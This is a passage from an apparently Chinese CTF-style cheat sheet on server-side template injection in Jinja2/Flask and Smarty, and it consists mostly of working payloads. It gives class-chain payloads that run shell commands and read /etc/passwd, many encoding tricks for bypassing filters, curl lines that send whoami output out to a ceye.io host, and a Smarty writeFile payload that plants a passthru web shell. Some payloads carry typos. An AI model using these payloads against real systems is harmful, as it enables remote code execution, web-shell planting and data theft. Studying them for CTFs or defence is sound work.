#有和&#123;%%&#125;相同的效果</code></pre><p>有些时候过滤可能会ban掉双括号，这时候可能就需要用到上面的一些语法</p><h4 id="jinja2的俄罗斯套娃"><a href="#jinja2的俄罗斯套娃" class="headerlink" title="jinja2的俄罗斯套娃"></a>jinja2的俄罗斯套娃</h4><p>看过jinja2相关模板注入题目的人就能明白是什么意思了哈哈()</p><p>介绍一下基类的一些概念之类的吧</p><p><code>&#39;&#39; [] ()</code>都是最简单的数据类型，而我们最一般的思路就是通过这些来找到基类，这里就要涉及到一些魔术方法了</p><p>那就按顺序进行一个介绍吧</p><p>首先，我们的目的是要找到基类</p><p>于是我们就要用到<code>__class__</code>返回一个实例所属的类</p><p>但是我们的目的是找到Object基类，那么我们需要进一步返回</p><p>所以就要用到<code>__base__ __bases__  __mro__</code></p><p><code>base</code>最为直接，就是直接返回上层的父类，而<code>bases</code>是递归返回所有上面的类，术语上是叫元组，<code>mro</code>同理,但是会包含原来就所属的类</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250414125152769.png" alt="image-20250414125152769"></p><p>找到Object之后呢，由于我们的目的是得到一个可以任意命令执行的板块，我们就需要找到<code>os</code>这些类似的方法，那么就要用到<code>__subclass__()</code>以及后面的一些东西</p><p>subclasses是返回子类，通常这个时候就会跳一大串的子类，没脚本是不得行的(不是哥们你真想手找吗)</p><p>而返回子类后我们就要做出一个重大的决策，根据版本打不同的payload,详见文件读取的子类(py2人上人)</p><p>一般我们的选择 是两种</p><ul><li>文件读取</li><li>内置模块任意命令执行</li></ul><pre><code class="highlight python"><span class="comment">#文件读取</span><span class="comment">#python2</span>file -&gt;(<span class="string">&#x27;path&#x27;</span>).read()<span class="comment">#python3</span>_frozen_importlib_external.FiieLoader -&gt;[<span class="string">&quot;get_data&quot;</span>](<span class="number">0</span>,<span class="string">&quot;/etc/passwd&quot;</span>)<span class="comment">#当然也可以拿内置模块再文件读取，但是感觉不得已才会这样打</span></code></pre><pre><code class="highlight python"><span class="comment">#函数rce</span><span class="comment">#不知道和版本有没有关系，反正找到还没有被过滤直接打就行</span>&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[xx].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;</span>)&#125;&#125;&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]__.__subclasses__()[xx].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>][<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">58</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami’)&#125;&#125;</span><span class="string">&#123;&#123; &#x27;</span><span class="string">&#x27;.__class__.__base__.__subclasses__()[10].__init__.__globals__[&#x27;</span>__builtins__<span class="string">&#x27;][&#x27;</span><span class="built_in">eval</span><span class="string">&#x27;](&#x27;</span><span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;cat /flag&quot;</span>).read()<span class="string">&#x27;) &#125;&#125;#eval</span></code></pre><pre><code class="highlight python"><span class="comment">#类的rce</span>&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]__.__subclasses__()[xx][<span class="string">&#x27;load_moudule&#x27;</span>](<span class="string">&quot;os&quot;</span>)[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;ls&quot;</span>).read()&#125;&#125;<span class="comment">#importlib</span>&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro[<span class="number">2</span>]__.__subclasses__()[xx](<span class="string">&#x27;ls&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;<span class="comment">#subprocess.Popen 个人觉得唯一真神好吧</span></code></pre><pre><code class="highlight python"><span class="comment">#内置OS模块rce(这个其实就多了哈哈)不管类内置的还是函数内置的有就行了，这边重点介绍类的吧，因为函数内置的后面会讲的</span>os._wrap_close //<span class="number">117</span>warnings.catch_warnings //<span class="number">59</span>warnings.WarningMessagesocket._socketobjectsite._Printer //<span class="number">71</span>site.Quittesubprocess.Popen //<span class="number">258</span></code></pre><p>再贴一个找到内置os模块的脚本</p><pre><code class="highlight plaintext">#coding:utf-8search = &#x27;os&#x27;   #也可以是其他你想利用的模块num = -1for i in ().__class__.__bases__[0].__subclasses__():    num += 1    try:        if search in i.__init__.__globals__.keys():            print(i, num)    except:        pass</code></pre><p>后面的操作就比较公式化了</p><p>直接贴一下好了</p><pre><code class="highlight python"><span class="comment">#python2</span>__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)__init__.func_globals.linecache.os.popen(<span class="string">&#x27;id&#x27;</span>).read()__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span>)__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)<span class="comment">#python3</span>__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;file&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)__init__[<span class="string">&#x27;__globals__&#x27;</span>][<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].listdir(<span class="string">&#x27;.&#x27;</span>)__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><span class="string">__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read()</span><span class="string"></span></code></pre><p><strong>觉得烦?那最快的就来了</strong></p><p>利用flask内置函数，效率高，payload短，就是容易被ban(</p><pre><code class="highlight jinja2">1)config #获取配置信息&#123;&#123;config.__class__.__init__.__globals__[&quot;os&quot;].popen(&quot;cat+/flag&quot;).read()&#125;&#125;2)lipsum&#123;&#123; lipsum.__globals__.__builtins__.open(&#x27;/flag&#x27;).read() &#125;&#125;3)request&#123;&#123;request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;).read()&#125;&#125;&#123;&#123;request.application.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;).read()&#125;&#125;4)url_for&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;5)get_flashed &#123;&#123;get_flashed_messages.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;</code></pre><p><strong>总结一下，就是先找到一个合适的攻城锤(内含os的类或可命令执行的函数)和一把趁手的宝剑(可以使用的方法)</strong></p><h4 id="jinja2的过滤"><a href="#jinja2的过滤" class="headerlink" title="jinja2的过滤"></a>jinja2的过滤</h4><p><strong>过滤[</strong></p><pre><code class="highlight python"><span class="comment">#getitem、pop</span><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(<span class="string">&#x27;ls&#x27;</span>).read()<span class="comment">#也可以用__getattribute__绕过</span>&#123;&#123;<span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>).__base__&#125;&#125;<span class="comment">#或者配合request</span>&#123;&#123;().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(<span class="number">376</span>).__init__.__globals__.popen(request.args.arg2).read()&#125;&#125;&amp;arg1=__class__&amp;arg2=whoami<span class="comment">#或者用print标记</span>&#123;%<span class="built_in">print</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)%&#125;</code></pre><p><strong>过滤引号</strong></p><pre><code class="highlight plaintext">#chr函数&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()&#125;&#125;#request对象&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd#命令执行&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd=id#request 绕过&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=open&amp;arg2=/etc/passwd    \#分析：request.args 是flask中的一个属性,为返回请求的参数,这里把path当作变量名,将后面的路径传值进来,进而绕过了引号的过滤。若args被过滤了，还可以使用values来接受GET或者POST参数。：&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()&#125;&#125;Cookie:arg1=open;arg2=/etc/passwd&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125;&#125;post:arg1=open&amp;arg2=/etc/passwd</code></pre><p><strong>过滤下划线</strong></p><pre><code class="highlight plaintext">&#123;&#123;&#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__//request.args.xx就能直接查询对应的参数值，把原参数换成[request.args.xx]即可</code></pre><p><strong>过滤花括号</strong></p><pre><code class="highlight plaintext">#用&#123;%%&#125;标记，同时外带&#123;% if &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;curl http://127.0.0.1:7999/?i=`whoami`&#x27;).read()==&#x27;p&#x27; %&#125;1&#123;% endif %&#125;&#123;% if ().__class__.__base__.__subclasses__()[433].__init__.__globals__[&#x27;popen&#x27;](&quot;curl `whoami`.k1o75b.ceye.io&quot;).read()==&#x27;kawhi&#x27; %&#125;1&#123;% endif %&#125;</code></pre><p><strong>过滤关键字</strong></p><ul><li>利用内置的语法传参的值：</li></ul><p>如<code>request.args.[变量名](get传参) request.cookies.[变量名](cookies传参)</code></p><ul><li>使用切片将逆置的关键字顺序输出，进而达到绕过。</li></ul><pre><code class="highlight plaintext">&quot;&quot;[&quot;__cla&quot;&quot;ss__&quot;]&quot;&quot;.__getattribute__(&quot;__cla&quot;&quot;ss__&quot;)</code></pre><ul><li>反转</li></ul><pre><code class="highlight plaintext">&quot;&quot;[&quot;__ssalc__&quot;][::-1]&quot;&quot;.__getattribute__(&quot;__ssalc__&quot;[::-1])</code></pre><ul><li>利用”+”进行字符串拼接，绕过关键字过滤。</li></ul><pre><code class="highlight plaintext">&#123;&#123;()[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__subclasses__()[40].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&quot;__im&quot;+&quot;port__(&#x27;o&#x27;+&#x27;s&#x27;).po&quot;&quot;pen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;[][%27__cla%27+%27ss__%27][%27__ba%27+%27se__%27][%27__subcl%27+%27asses__%27]()[117][&quot;__in&quot;+&quot;it__&quot;][&quot;__glo&quot;+&quot;bals__&quot;][&#x27;popen&#x27;](&#x27;ls /&#x27;).read()</code></pre><ul><li>join拼接</li></ul><p>利用join（）函数绕过关键字过滤</p><pre><code class="highlight plaintext">&#123;&#123;[].__class__.__base__.__subclasses__()[40](&quot;fla&quot;.join(&quot;/g&quot;)).read()&#125;&#125;&#123;&#123;()|attr([&quot;_&quot;*2,&quot;cla&quot;,&quot;ss&quot;,&quot;_&quot;*2]|join)&#125;&#125;&#123;&#123;()|attr(request.args.f|format(request.args.a))&#125;&#125;&amp;f=__c%sass__&amp;a=l</code></pre><ul><li>利用引号绕过</li></ul><pre><code class="highlight plaintext">[&#123;&#123;[].__class__.__base__.__subclasses__()40&quot;/fl&quot;&quot;ag&quot;.read()&#125;&#125;]()</code></pre><ul><li>使用str原生函数replace替换</li></ul><p>将额外的字符拼接进原本的关键字里面，然后利用replace函数将其替换为空。</p><pre><code class="highlight plaintext">&#123;&#123;().__getattribute__(&#x27;__claAss__&#x27;.replace(&quot;A&quot;,&quot;&quot;)).__bases__[0].__subclasses__()[376].__init__.__globals__[&#x27;popen&#x27;](&#x27;whoami&#x27;).read()&#125;&#125;</code></pre><ul><li>ascii转换</li></ul><pre><code class="highlight plaintext">将每一个字符都转换为ascii值后再拼接在一起。&quot;&#123;0:c&#125;&quot;.format(97)=&#x27;a&#x27;&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;.format(95,95,99,108,97,115,115,95,95)=&#x27;__class__&#x27;</code></pre><ul><li>16进制编码绕过</li></ul><pre><code class="highlight plaintext">&quot;__class__&quot;==&quot;\x5f\x5fclass\x5f\x5f&quot;==&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;例子：&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&#x27;](&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;\同理，也可使用八进制编码绕过</code></pre><ul><li><p>base64编码绕过</p><p>对于python2，可利用base64进行绕过，对于python3没有decode方法，不能使用该方法进行绕过。</p></li></ul><pre><code class="highlight plaintext">&#123;&#123;().__getattribute__(&#x27;X19jbGFzc19f&#x27;.decode(&#x27;base64&#x27;)).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125;&#125;//__class__</code></pre><p>例子：</p><pre><code class="highlight plaintext">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;X19idWlsdGluc19f&#x27;.decode(&#x27;base64&#x27;)][&#x27;ZXZhbA==&#x27;.decode(&#x27;base64&#x27;)](&#x27;X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ==&#x27;.decode(&#x27;base64&#x27;))&#125;&#125;  等价于  &#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</code></pre><ul><li>unicode编码绕过</li></ul><pre><code class="highlight jinja2">&#123;%print((((lipsum|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;os&quot;))|attr(&quot;\u0070\u006f\u0070\u0065\u006e&quot;)(&quot;\u0074\u0061\u0063\u0020\u002f\u0066\u002a&quot;))|attr(&quot;\u0072\u0065\u0061\u0064&quot;)())%&#125;等同于lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;tac /f*&#x27;).read()</code></pre><ul><li>Hex编码绕过</li></ul><pre><code class="highlight jinja2">[&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#x27;][&#x27;\x65\x76\x61\x6c&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;]()&#123;#温馨提示，连关键词都转换掉是有概率褒姒的，推荐用来绕过一下符号的过滤差不多够用了#&#125;&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;\x6f\x73&#x27;].popen(&#x27;\x6c\x73\x20\x2f&#x27;).read()&#125;&#125;   等价于   &#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</code></pre><ul><li>绕过i<strong>nit</strong><br>可以用<code>__enter__</code>或<code>__exit__</code>替代<code>__init__</code></li></ul><pre><code class="highlight plaintext">&#123;().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</code></pre><pre><code class="highlight plaintext">&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</code></pre><ul><li>绕过config</li></ul><pre><code class="highlight plaintext">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt;&#123;&#123;self.__dict__._TemplateReference__context&#125;&#125;</code></pre><ul><li>过滤args和.和_</li></ul><pre><code class="highlight plaintext">&#123;&#123;()|attr(request[&#x27;values&#x27;][&#x27;x1&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x2&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x3&#x27;])()|attr(request[&#x27;values&#x27;][&#x27;x4&#x27;])(40)|attr(request[&#x27;values&#x27;][&#x27;x5&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x6&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x4&#x27;])(request[&#x27;values&#x27;][&#x27;x7&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x4&#x27;])(request[&#x27;values&#x27;][&#x27;x8&#x27;])(request[&#x27;values&#x27;][&#x27;x9&#x27;])&#125;&#125;post:x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&#x27;whoami&#x27;).read()</code></pre><h4 id="打马环节-待补完"><a href="#打马环节-待补完" class="headerlink" title="打马环节(待补完)"></a>打马环节(待补完)</h4><h2 id="PHP模板注入"><a href="#PHP模板注入" class="headerlink" title="PHP模板注入"></a>PHP模板注入</h2><p>php常见的模板：twig，smarty，blade</p><h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p>PHP模板的鼻祖，后来的php模板大多都是基于其发展起来的</p><p>基本确定指令</p><pre><code class="highlight php">&#123;<span class="variable">$smarty</span>.version&#125; <span class="comment">//查看smarty的版本来确定姿势</span></code></pre><p>说实话，smarty的姿势还是蛮多的，先给三种比较常见的吧</p><ul><li><p>基于XFF的普通注入:在{}内疯狂输出</p></li><li><p>利用{include}来任意文件读取；string:{include file&#x3D;’D:\flag.txt’}这时文本内容就被读取了</p></li></ul><h4 id="通过self获取Smarty类再调用其静态方法"><a href="#通过self获取Smarty类再调用其静态方法" class="headerlink" title="通过self获取Smarty类再调用其静态方法"></a><strong>通过self获取Smarty类再调用其静态方法</strong></h4><p><strong>getStreamVariable:</strong></p><pre><code class="highlight php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span>(<span class="params"><span class="variable">$variable</span></span>)//<span class="title">variable</span>其实就是文件路径</span><span class="function"></span>&#123;        <span class="variable">$_result</span> = <span class="string">&#x27;&#x27;</span>;        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$variable</span>, <span class="string">&#x27;r+&#x27;</span>);<span class="comment">//从此处开始对文件进行读取</span>        <span class="keyword">if</span> (<span class="variable">$fp</span>) &#123;            <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>) &amp;&amp; (<span class="variable">$current_line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;                <span class="variable">$_result</span> .= <span class="variable">$current_line</span>;            &#125;            <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);            <span class="keyword">return</span> <span class="variable">$_result</span>;        &#125;        <span class="variable">$smarty</span> = <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;smarty) ? <span class="variable language_">$this</span>-&gt;smarty : <span class="variable language_">$this</span>;        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;error_unassigned) &#123;            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&#x27;Undefined stream variable &quot;&#x27;</span> . <span class="variable">$variable</span> . <span class="string">&#x27;&quot;&#x27;</span>);        &#125; <span class="keyword">else</span> &#123;            <span class="keyword">return</span> <span class="literal">null</span>;        &#125;    &#125;<span class="comment">//可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法</span>smarty/libs/sysplugins/smarty_internal_data.php　　——&gt;　　<span class="title function_ invoke__">getStreamVariable</span>() 这个方法可以获取传入变量的流例如：&#123;<span class="built_in">self</span>::<span class="title function_ invoke__">getStreamVariable</span>(<span class="string">&quot;file:///etc/passwd&quot;</span>)&#125;</code></pre><p>payload形如：<code>&#123;self::getStreamVariable(“file:///etc/passwd”)&#125;</code> &#x2F;&#x2F;在v3.1.30退出历史舞台</p><p><strong>writeFile：</strong></p><p>这个不是很懂，直接引用这个大佬的博客吧</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250307213236244.png" alt="image-20250307213236244"></p><pre><code class="highlight php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span>(<span class="params"><span class="variable">$_filepath</span>, <span class="variable">$_contents</span>, Smarty <span class="variable">$smarty</span></span>)</span><span class="function">    </span>&#123;        <span class="variable">$_error_reporting</span> = <span class="title function_ invoke__">error_reporting</span>();        <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span> &amp; ~E_NOTICE &amp; ~E_WARNING);        <span class="variable">$_file_perms</span> = <span class="title function_ invoke__">property_exists</span>(<span class="variable">$smarty</span>, <span class="string">&#x27;_file_perms&#x27;</span>) ? <span class="variable">$smarty</span>-&gt;_file_perms : <span class="number">0644</span>;        <span class="variable">$_dir_perms</span> = <span class="title function_ invoke__">property_exists</span>(<span class="variable">$smarty</span>, <span class="string">&#x27;_dir_perms&#x27;</span>) ? (<span class="keyword">isset</span>(<span class="variable">$smarty</span>-&gt;_dir_perms) ? <span class="variable">$smarty</span>-&gt;_dir_perms : <span class="number">0777</span>)  : <span class="number">0771</span>;        <span class="keyword">if</span> (<span class="variable">$_file_perms</span> !== <span class="literal">null</span>) &#123;            <span class="variable">$old_umask</span> = <span class="title function_ invoke__">umask</span>(<span class="number">0</span>);        &#125;        <span class="variable">$_dirpath</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_filepath</span>);        <span class="comment">// if subdirs, create dir structure</span>        <span class="keyword">if</span> (<span class="variable">$_dirpath</span> !== <span class="string">&#x27;.&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">file_exists</span>(<span class="variable">$_dirpath</span>)) &#123;            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$_dirpath</span>, <span class="variable">$_dir_perms</span>, <span class="literal">true</span>);        &#125;        <span class="comment">// write to tmp file, then move to overt file lock race condition</span>        <span class="variable">$_tmp_file</span> = <span class="variable">$_dirpath</span> . DS . <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>), <span class="string">&#x27;_&#x27;</span>, <span class="title function_ invoke__">uniqid</span>(<span class="string">&#x27;wrt&#x27;</span>, <span class="literal">true</span>));        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_tmp_file</span>, <span class="variable">$_contents</span>)) &#123;            <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span>);            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);       &#125;</code></pre><p>我们在往上面看，可以看到这个方法是在<code>class Smarty_Internal_Runtime_WriteFile</code>下的，</p><p>我们注意看这段代码</p><pre><code class="highlight php"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_tmp_file</span>, <span class="variable">$_contents</span>)) &#123;            <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span>);            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);       &#125;</code></pre><p>这段代码将文件内容写入临时文件，如果写入失败，则恢复先前的错误报告级别，并抛出异常。</p><p>这里的具体解释我会在下面的CVE-2017-1000480具体讲到，先挖个坑，这里写入临时文件，在loadCompiledTemplate函数下，存在语句</p><pre><code class="highlight php"><span class="keyword">eval</span>(<span class="string">&quot;?&gt;&quot;</span> . <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filepath));</code></pre><p>就有了</p><pre><code class="highlight php">&#123;<span class="title class_">Smarty_Internal_Write_File</span>::<span class="title function_ invoke__">writeFile</span>(<span class="variable">$SCRIPT_NAME</span>,<span class="string">&quot;&lt;?php passthru(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,<span class="built_in">self</span>::<span class="title function_ invoke__">clearConfig</span>())&#125;</code></pre><p>我们将<code>&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;</code>写入了临时php文件中</p><p><code>self::clearConfig()</code> 是一个 Smarty 内部方法，用于清除模板引擎的配置选项。</p><p><code>$SCRIPT_NAME</code> 是一个在 PHP 中预定义的变量，用于表示当前执行脚本的文件路径和名称。</p><p>但是writeFile方法也有版本限制，所以我们首先要确定模板的版本，再决定对应的攻击方法。</p><h4 id="标签"><a href="#标签" class="headerlink" title="标签:"></a>标签:</h4><p><strong>{$smarty.version}</strong></p><p>获取smarty的版本信息</p><p><strong>{literal}</strong></p><p>此标签的利用方法仅仅是在php5.x的版本中才可以使用，因为在 PHP5 环境下存在一种 PHP 标签， <code>&lt;script&gt;language=&quot;php&quot;&gt;&lt;/script&gt;，</code>我们便可以利用这一标签进行任意的 PHP 代码执行。但是在php7的版本中<code>&#123;literal&#125;xxxx;&#123;/literal&#125;</code>标签中间的内容就会被原封不动的输出，并不会解析。</p><p>作用：{literal} 可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为 Smarty 的定界符而错被解析。</p><p>所以我们就可以利用其的作用来进行xss攻击SSTI等漏洞利用。</p><pre><code class="highlight php">&#123;literal&#125;&lt;script&gt;language=<span class="string">&quot;php&quot;</span>&gt;xxx&lt;/script&gt;;&#123;/literal&#125;</code></pre><p><strong>{php}{&#x2F;php}</strong></p><p>用于执行php代码</p><pre><code class="highlight php">&#123;php&#125;<span class="title function_ invoke__">phpinfo</span>();&#123;/php&#125;</code></pre><p>但是这个方法在Smarty3版本中已经被禁用了，不过多赘述了。</p><p><strong>{if}{&#x2F;if}</strong></p><pre><code class="highlight php">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">phpinfo</span>()&#125;&#123;/<span class="keyword">if</span>&#125;&#123;<span class="keyword">if</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;<span 